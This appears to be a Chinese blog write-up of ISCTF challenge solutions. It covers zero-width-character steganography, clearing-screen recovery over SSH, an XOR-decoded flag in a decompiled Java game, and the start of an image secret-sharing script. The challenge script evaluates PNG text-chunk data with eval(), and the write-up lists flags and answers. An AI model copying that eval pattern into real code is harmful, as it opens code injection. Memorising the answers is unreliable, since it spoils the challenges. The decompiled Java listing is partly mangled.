EF BC 8C E9 AA 97 E4 BD A0 E6 89 93 E4 B8 80 E8 BE 88 E5 AD 90 63 74 66 E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D E2 80 AC E2 80 8D E2 80 8C 0A E6 9C AC E9 A2 98 E6 98 AF E4 B8 80 E9 81 93 E7 AD BE E5 88 B0 E9 A2 98 EF BC 8C E7 9C 9F E7 AD BE E5 88 B0 E9 A2 98 E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D E2 80 8D EF BB BF EF BB BF EF BC 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D EF BB BF E2 80 8D E2 80 8C E4 B8 8D E9 AA 97 E4 BD A0 E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D E2 80 AC E2 80 AC E2 80 8C EF BC 8C E9 AA 97 E4 BD A0 E6 89 93 E4 B8 80 E8 BE 88 E5 AD 90 63 74 66 0A E6 9C AC E9 A2 98 E6 98 AF E4 B8 80 E9 81 93 E7 AD BE E5 88 B0 E9 A2 98 E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D E2 80 AC E2 80 8C E2 80 8D EF BC 8C E7 9C 9F E7 AD BE E5 88 B0 E9 A2 98 EF BC 8C E4 B8 8D E9 AA 97 E4 BD A0 EF BC 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8C EF BB BF E2 80 8D EF BB BF E9 AA 97 E4 BD A0 E6 89 93 E4 B8 80 E8 BE 88 E5 AD 90 63 74 66 0A E6 9C AC E9 A2 98 E6 98 AF E4 B8 80 E9 81 93 E7 AD BE E5 88 B0 E9 A2 98 EF BC 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D E2 80 8D EF BB BF EF BB BF E7 9C 9F E7 AD BE E5 88 B0 E9 A2 98 EF BC 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8C EF BB BF E2 80 AC E2 80 8D E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D E2 80 AC EF BB BF EF BB BF E4 B8 8D E9 AA 97 E4 BD A0 EF BC 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D EF BB BF E2 80 8D E2 80 8D E9 AA 97 E4 BD A0 E6 89 93 E4 B8 80 E8 BE 88 E5 AD 90 63 74 66 0A E6 9C AC E9 A2 98 E6 98 AF E4 B8 80 E9 81 93 E7 AD BE E5 88 B0 E9 A2 98 E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D E2 80 8D EF BB BF EF BB BF E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D E2 80 AC E2 80 8C EF BB BF EF BC 8C E7 9C 9F E7 AD BE E5 88 B0 E9 A2 98 EF BC 8C E4 B8 8D E9 AA 97 E4 BD A0 EF BC 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D E2 80 AC E2 80 8C E2 80 8D E9 AA 97 E4 BD A0 E6 89 93 E4 B8 80 E8 BE 88 E5 AD 90 63 74 66 E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D E2 80 8C EF BB BF E2 80 AC 0A E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D E2 80 8D EF BB BF EF BB BF E6 9C AC E9 A2 98 E6 98 AF E4 B8 80 E9 81 93 E7 AD BE E5 88 B0 E9 A2 98 E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D E2 80 AC EF BB BF E2 80 AC EF BC 8C E7 9C 9F E7 AD BE E5 88 B0 E9 A2 98 EF BC 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8C EF BB BF E2 80 8C E2 80 8C E4 B8 8D E9 AA 97 E4 BD A0 E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D EF BB BF E2 80 8D E2 80 8C EF BC 8C E9 AA 97 E4 BD A0 E6 89 93 E4 B8 80 E8 BE 88 E5 AD 90 63 74 66 0A E6 9C AC E9 A2 98 E6 98 AF E4 B8 80 E9 81 93 E7 AD BE E5 88 B0 E9 A2 98 EF BC 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 AC E2 80 8C E2 80 8C E7 9C 9F E7 AD BE E5 88 B0 E9 A2 98 E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D E2 80 8D EF BB BF EF BB BF EF BC 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D E2 80 AC E2 80 8C E2 80 AC E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D EF BB BF E2 80 8C E2 80 AC E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D EF BB BF E2 80 8D E2 80 8D E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D EF BB BF E2 80 8D E2 80 8C E4 B8 8D E9 AA 97 E4 BD A0 E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8C EF BB BF E2 80 8C EF BB BF EF BC 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D E2 80 8D EF BB BF EF BB BF E9 AA 97 E4 BD A0 E6 89 93 E4 B8 80 E8 BE 88 E5 AD 90 E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D E2 80 8C E2 80 8D E2 80 AC 63 74 66 0A E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D E2 80 AC EF BB BF EF BB BF E6 9C AC E9 A2 98 E6 98 AF E4 B8 80 E9 81 93 E7 AD BE E5 88 B0 E9 A2 98 EF BC 8C E7 9C 9F E7 AD BE E5 88 B0 E9 A2 98 EF BC 8C E4 B8 8D E9 AA 97 E4 BD A0 EF BC 8C E9 AA 97 E4 BD A0 E6 89 93 E4 B8 80 E8 BE 88 E5 AD 90 63 74 66 0A E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D EF BB BF E2 80 8C E2 80 AC E6 9C AC E9 A2 98 E6 98 AF E4 B8 80 E9 81 93 E7 AD BE E5 88 B0 E9 A2 98 E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D E2 80 AC E2 80 8C EF BB BF EF BC 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8C EF BB BF E2 80 8C EF BB BF E7 9C 9F E7 AD BE E5 88 B0 E9 A2 98 EF BC 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D E2 80 8D EF BB BF EF BB BF E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D E2 80 AC E2 80 AC E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D E2 80 AC E2 80 AC E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D E2 80 AC E2 80 AC E2 80 8C E4 B8 8D E9 AA 97 E4 BD A0 EF BC 8C E9 AA 97 E4 BD A0 E6 89 93 E4 B8 80 E8 BE 88 E5 AD 90 63 74 66 E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D E2 80 AC E2 80 AC E2 80 8C 0A E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D E2 80 AC E2 80 AC E2 80 8C E6 9C AC E9 A2 98 E6 98 AF E4 B8 80 E9 81 93 E7 AD BE E5 88 B0 E9 A2 98 EF BC 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D E2 80 AC E2 80 AC E2 80 8C E7 9C 9F E7 AD BE E5 88 B0 E9 A2 98 EF BC 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D E2 80 AC E2 80 AC E2 80 8C E4 B8 8D E9 AA 97 E4 BD A0 EF BC 8C E9 AA 97 E4 BD A0 E6 89 93 E4 B8 80 E8 BE 88 E5 AD 90 E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D E2 80 AC E2 80 AC E2 80 8C 63 74 66 E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D E2 80 AC E2 80 AC E2 80 8C 0A E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D E2 80 AC E2 80 AC E2 80 8C E6 9C AC E9 A2 98 E6 98 AF E4 B8 80 E9 81 93 E7 AD BE E5 88 B0 E9 A2 98 EF BC 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D E2 80 AC E2 80 AC E2 80 8C E7 9C 9F E7 AD BE E5 88 B0 E9 A2 98 EF BC 8C E4 B8 8D E9 AA 97 E4 BD A0 E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D E2 80 AC E2 80 AC E2 80 8C EF BC 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D E2 80 AC E2 80 AC E2 80 8C E9 AA 97 E4 BD A0 E6 89 93 E4 B8 80 E8 BE 88 E5 AD 90 63 74 66 E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D E2 80 AC E2 80 AC E2 80 8C 0A E6 9C AC E9 A2 98 E6 98 AF E4 B8 80 E9 81 93 E7 AD BE E5 88 B0 E9 A2 98 EF BC 8C E7 9C 9F E7 AD BE E5 88 B0 E9 A2 98 E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D E2 80 AC E2 80 8C E2 80 8D EF BC 8C E4 B8 8D E9 AA 97 E4 BD A0 E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D E2 80 8C E2 80 AC E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D E2 80 AC E2 80 8C E2 80 8D EF BC 8C E9 AA 97 E4 BD A0 E6 89 93 E4 B8 80 E8 BE 88 E5 AD 90 63 74 66 E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D E2 80 AC E2 80 8C E2 80 8D 0A E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D E2 80 8D EF BB BF EF BB BF E6 9C AC E9 A2 98 E6 98 AF E4 B8 80 E9 81 93 E7 AD BE E5 88 B0 E9 A2 98 EF BC 8C E7 9C 9F E7 AD BE E5 88 B0 E9 A2 98 E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D E2 80 AC EF BB BF E2 80 AC EF BC 8C E4 B8 8D E9 AA 97 E4 BD A0 EF BC 8C E9 AA 97 E4 BD A0 E6 89 93 E4 B8 80 E8 BE 88 E5 AD 90 63 74 66 E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D E2 80 AC EF BB BF EF BB BF E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8C EF BB BF E2 80 8C E2 80 8C 0A E6 9C AC E9 A2 98 E6 98 AF E4 B8 80 E9 81 93 E7 AD BE E5 88 B0 E9 A2 98 EF BC 8C E7 9C 9F E7 AD BE E5 88 B0 E9 A2 98 EF BC 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D E2 80 AC E2 80 8C E2 80 AC E4 B8 8D E9 AA 97 E4 BD A0 EF BC 8C E9 AA 97 E4 BD A0 E6 89 93 E4 B8 80 E8 BE 88 E5 AD 90 63 74 66 0A</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 清理十六进制</span></span><br><span class="line">clean_hex = re.sub(<span class="string">r'[^0-9A-Fa-f]'</span>, <span class="string">''</span>, hex_data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    bytes_data = <span class="built_in">bytes</span>.fromhex(clean_hex)</span><br><span class="line"><span class="keyword">except</span> ValueError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"十六进制转换错误: <span class="subst">{e}</span>"</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    full_text = bytes_data.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"UTF-8解码成功，总字符数: <span class="subst">{<span class="built_in">len</span>(full_text)}</span>"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 保存到UTF-8文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"decoded_utf8.txt"</span>, <span class="string">"w"</span>, encoding=<span class="string">"utf-8"</span>, errors=<span class="string">"ignore"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(full_text)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"已保存UTF-8文本到: decoded_utf8.txt"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 显示预览（前2000字符）</span></span><br><span class="line">    <span class="built_in">print</span>(full_text[:<span class="number">2000</span>])</span><br><span class="line">    </span><br><span class="line"><span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"UTF-8解码失败，尝试Latin-1解码..."</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        full_text = bytes_data.decode(<span class="string">'latin-1'</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"decoded_latin1.txt"</span>, <span class="string">"w"</span>, encoding=<span class="string">"utf-8"</span>, errors=<span class="string">"ignore"</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(full_text)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"\n预览:"</span>, full_text[:<span class="number">2000</span>])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"解码失败"</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"完成！"</span>)</span><br></pre></td></tr></table></figure>
<p>把得到的文本全部复制到<a target="_blank" rel="noopener" href="https://330k.github.io/misc_tools/unicode_steganography.html">Unicode Steganography with Zero-Width Characters</a>解码</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">this_p@ssw0rd_tha7_9ou_caN_n0t _brut3_Forc3_hhhhhhhhhhhhhhaHaa_no0b</span><br></pre></td></tr></table></figure>
<p>我真裂开了，这么长的密码我爆破个der</p>
<p>打开rar即可。<strong>ISCTF{320303e2-5c6a-489a-bcd3-e96a69a3eefc}</strong></p>
<ul>
<li><p>消失的flag</p>
<blockquote>
<p>“咦？我flag呢，我不是输出了么？</p>
<p>用户名：qyy</p>
<p>无密码”</p>
</blockquote>
</li>
</ul>
<p>nc容器，啥也没有，怀疑清屏</p>
<p>ssh连接并打印出清屏前的指令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh qyy@challenge.bluesharkinfo.com -p 28892 | <span class="built_in">cat</span> -v</span><br></pre></td></tr></table></figure>
<p>得到<strong>ISCTF{9b39f3d8-3c8d-4655-b8bd-69f44ad21e87}</strong></p>
<ul>
<li><p>冲刺！偷摸零！</p>
<blockquote>
<p>小蓝鲨的实训作业……但似乎漏洞百出？（Flag有两段）</p>
<p>Hint:jar包里的东西也要看一眼</p>
</blockquote>
</li>
</ul>
<p>此题对新手颇有难度，这次对java程序也熟悉了不少</p>
<p>run-1.0-SNAPSHOT-jar-with-dependencies.jar 可以直接解压</p>
<p>看到了ctf.db直接点进去看看，乱码，搜索ISCTF可得到正确flag的前半段<strong>ISCTF{Tom0R1_Dash</strong></p>
<p>剩下的肯定是动态运行程序了</p>
<p>可以吃掉所有伤害快速结束游戏</p>
<p><img src="/images/image-20251209133437982.png" alt=""></p>
<p>于是游戏结束肯定是关键。下载<a target="_blank" rel="noopener" href="https://github.com/java-decompiler/jd-gui/releases/download/v1.6.6/jd-gui-1.6.6-min.jar">https://github.com/java-decompiler/jd-gui/releases/download/v1.6.6/jd-gui-1.6.6-min.jar</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jd-gui-1.6.6-min.jar</span><br></pre></td></tr></table></figure>
<p>实现java反编译</p>
<p>打开文件，找到com.qf.run.GameOverView即可</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qf.run;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.qf.pojo.Person;</span><br><span class="line"><span class="keyword">import</span> java.awt.Color;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.ActionEvent;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.ActionListener;</span><br><span class="line"><span class="keyword">import</span> javax.swing.JButton;</span><br><span class="line"><span class="keyword">import</span> javax.swing.JFrame;</span><br><span class="line"><span class="keyword">import</span> javax.swing.JLabel;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GameOverView</span> <span class="keyword">extends</span> <span class="title class_">JFrame</span> <span class="keyword">implements</span> <span class="title class_">ActionListener</span> {</span><br><span class="line">  <span class="type">JLabel</span> <span class="variable">scoreJLabel</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="type">JButton</span> <span class="variable">againJButton</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="type">JButton</span> <span class="variable">exitJButton</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="type">JLabel</span> <span class="variable">hint1JLabel</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">GameOverView</span><span class="params">(Person person)</span> {</span><br><span class="line">    <span class="type">byte</span>[] encrypted = { </span><br><span class="line">        <span class="number">5</span>, <span class="number">20</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">103</span>, <span class="number">111</span>, <span class="number">10</span>, <span class="number">18</span>, <span class="number">32</span>, <span class="number">18</span>, </span><br><span class="line">        <span class="number">32</span>, <span class="number">10</span>, <span class="number">18</span>, <span class="number">20</span>, <span class="number">18</span>, <span class="number">20</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">40</span> };</span><br><span class="line">    <span class="type">byte</span> <span class="variable">key</span> <span class="operator">=</span> <span class="number">85</span>;</span><br><span class="line">    <span class="type">byte</span>[] decrypted = <span class="keyword">new</span> <span class="title class_">byte</span>[encrypted.length];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; encrypted.length; i++)</span><br><span class="line">      decrypted[i] = (<span class="type">byte</span>)(encrypted[i] ^ key); </span><br><span class="line">    <span class="type">String</span> <span class="variable">secret</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(decrypted);</span><br><span class="line">    <span class="built_in">this</span>.scoreJLabel = <span class="keyword">new</span> <span class="title class_">JLabel</span>();</span><br><span class="line">    <span class="built_in">this</span>.scoreJLabel.setText(<span class="string">"\t"</span> + person.getScore());</span><br><span class="line">    <span class="built_in">this</span>.scoreJLabel.setForeground(Color.ORANGE);</span><br><span class="line">    <span class="built_in">this</span>.scoreJLabel.setSize(<span class="number">200</span>, <span class="number">20</span>);</span><br><span class="line">    <span class="built_in">this</span>.scoreJLabel.setLocation(<span class="number">120</span>, <span class="number">30</span>);</span><br><span class="line">    add(<span class="built_in">this</span>.scoreJLabel);</span><br><span class="line">    <span class="built_in">this</span>.againJButton = <span class="keyword">new</span> <span class="title class_">JButton</span>(<span class="string">");</span></span><br><span class="line"><span class="string">    this.againJButton.setSize(100, 20);</span></span><br><span class="line"><span class="string">    this.againJButton.setLocation(80, 150);</span></span><br><span class="line"><span class="string">    this.againJButton.addActionListener(this);</span></span><br><span class="line"><span class="string">    add(this.againJButton);</span></span><br><span class="line"><span class="string">    this.exitJButton = new JButton();</span></span><br><span class="line"><span class="string">    this.exitJButton.setSize(100, 20);</span></span><br><span class="line"><span class="string">    this.exitJButton.setLocation(200, 150);</span></span><br><span class="line"><span class="string">    this.exitJButton.setText("</span>);</span><br><span class="line">    <span class="built_in">this</span>.exitJButton.addActionListener(<span class="built_in">this</span>);</span><br><span class="line">    add(<span class="built_in">this</span>.exitJButton);</span><br><span class="line">    <span class="built_in">this</span>.hint1JLabel = <span class="keyword">new</span> <span class="title class_">JLabel</span>();</span><br><span class="line">    <span class="built_in">this</span>.hint1JLabel.setText(<span class="string">"\n);</span></span><br><span class="line"><span class="string">    this.hint1JLabel.setForeground(Color.ORANGE);</span></span><br><span class="line"><span class="string">    this.hint1JLabel.setSize(200, 20);</span></span><br><span class="line"><span class="string">    this.hint1JLabel.setLocation(120, 50);</span></span><br><span class="line"><span class="string">    add(this.hint1JLabel);</span></span><br><span class="line"><span class="string">    BackGroundImage backGroundImage = new BackGroundImage("</span>/image/pp.png<span class="string">");</span></span><br><span class="line"><span class="string">    backGroundImage.setSize(393, 208);</span></span><br><span class="line"><span class="string">    add(backGroundImage);</span></span><br><span class="line"><span class="string">    setSize(393, 208);</span></span><br><span class="line"><span class="string">    setLocation(750, 300);</span></span><br><span class="line"><span class="string">    setTitle("</span>GAME OVER!!!<span class="string">");</span></span><br><span class="line"><span class="string">    setUndecorated(true);</span></span><br><span class="line"><span class="string">    setVisible(true);</span></span><br><span class="line"><span class="string">  }</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  public void actionPerformed(ActionEvent e) {</span></span><br><span class="line"><span class="string">    if (e.getSource().equals(this.againJButton)) {</span></span><br><span class="line"><span class="string">      setVisible(false);</span></span><br><span class="line"><span class="string">      dispose();</span></span><br><span class="line"><span class="string">      Thread thread = new Thread(new LoadingView());</span></span><br><span class="line"><span class="string">      thread.start();</span></span><br><span class="line"><span class="string">    } </span></span><br><span class="line"><span class="string">    if (e.getSource().equals(this.exitJButton))</span></span><br><span class="line"><span class="string">      System.exit(0); </span></span><br><span class="line"><span class="string">  }</span></span><br><span class="line"><span class="string">}</span></span><br></pre></td></tr></table></figure>
<p>固定密钥异或，可以秒</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">enc = [<span class="number">5</span>, <span class="number">20</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">103</span>, <span class="number">111</span>, <span class="number">10</span>, <span class="number">18</span>, <span class="number">32</span>, <span class="number">18</span>, <span class="number">32</span>, <span class="number">10</span>, <span class="number">18</span>, <span class="number">20</span>, <span class="number">18</span>, <span class="number">20</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">40</span>]</span><br><span class="line">key = <span class="number">85</span></span><br><span class="line">dec = [b ^ key <span class="keyword">for</span> b <span class="keyword">in</span> enc]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">''</span>.join(<span class="built_in">chr</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> dec))</span><br></pre></td></tr></table></figure>
<p>得到：PART2:_GuGu_GAGA!!}</p>
<p>所以<strong>ISCTF{Tom0R1_Dash_GuGu_GAGA!!}</strong></p>
<ul>
<li><p>Image_is_all_you_need</p>
<blockquote>
<p>你需要懂点AI和密码学</p>
</blockquote>
</li>
</ul>
<p>感觉此题颇难，超出能力范围。全程AI</p>
<p>share_secret.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> png</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">preprocessing</span>(<span class="params">path</span>):</span><br><span class="line">    img = Image.<span class="built_in">open</span>(path)        </span><br><span class="line">    data = np.asarray(img)         </span><br><span class="line">    <span class="keyword">return</span> data.flatten(), data.shape </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">insert_text_chunk</span>(<span class="params">src_png, dst_png, text</span>):</span><br><span class="line">    reader = png.Reader(filename=src_png)     </span><br><span class="line">    chunks = reader.chunks()                   </span><br><span class="line">    chunk_list = <span class="built_in">list</span>(chunks)                  </span><br><span class="line">    chunk_item = <span class="built_in">tuple</span>([<span class="string">b'tEXt'</span>, text])        </span><br><span class="line"></span><br><span class="line">    index = <span class="number">1</span>                               </span><br><span class="line">    chunk_list.insert(index, chunk_item)   </span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(dst_png, <span class="string">'wb'</span>) <span class="keyword">as</span> dst_file:      </span><br><span class="line">        png.write_chunks(dst_file, chunk_list)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_text_chunk</span>(<span class="params">src_png, index=<span class="number">1</span></span>):</span><br><span class="line">    reader = png.Reader(filename=src_png)    </span><br><span class="line">    chunks = reader.chunks()                 </span><br><span class="line">    chunk_list = <span class="built_in">list</span>(chunks)                </span><br><span class="line">    img_extra = chunk_list[index][<span class="number">1</span>].decode() </span><br><span class="line">    img_extra = <span class="built_in">eval</span>(img_extra)           </span><br><span class="line">    <span class="keyword">return</span> img_extra                      </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">polynomial</span>(<span class="params">img, n, r</span>):</span><br><span class="line">    num_pixels = img.shape[<span class="number">0</span>]                  </span><br><span class="line">    coefficients = np.random.randint(low=<span class="number">0</span>, high=<span class="number">257</span>, size=(num_pixels, r - <span class="number">1</span>)) </span><br><span class="line">    secret_imgs = []                          </span><br><span class="line">    imgs_extra = []                             </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n + <span class="number">1</span>):                 </span><br><span class="line">        base = np.array([i ** j <span class="keyword">for</span> j <span class="keyword">in</span> <span 